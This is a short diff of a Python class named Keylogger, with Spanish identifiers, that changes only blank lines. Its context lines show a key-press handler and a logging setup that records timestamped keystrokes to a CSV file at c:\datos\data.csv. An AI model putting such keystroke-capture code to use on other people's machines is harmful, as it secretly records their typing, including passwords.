@@ -11,7 +11,6 @@ class Keylogger:
     def detectarTeclaPresionada(key):
         Keylogger.ingresarTeclaPresionada(key)
 
-
     @staticmethod
     def ingresarTeclaPresionada(key):
         # Funcion que inserta la tecla pulsada al archivo Log
@@ -28,4 +27,7 @@ class Keylogger:
         ruta_log = "c:\\datos\\data.csv"
         logging.basicConfig(filename = (ruta_log), level = logging.DEBUG, format='%(asctime)s, %(message)s',
         datefmt="%Y-%m-%d %H:%M:%S")
+
+
+        
         
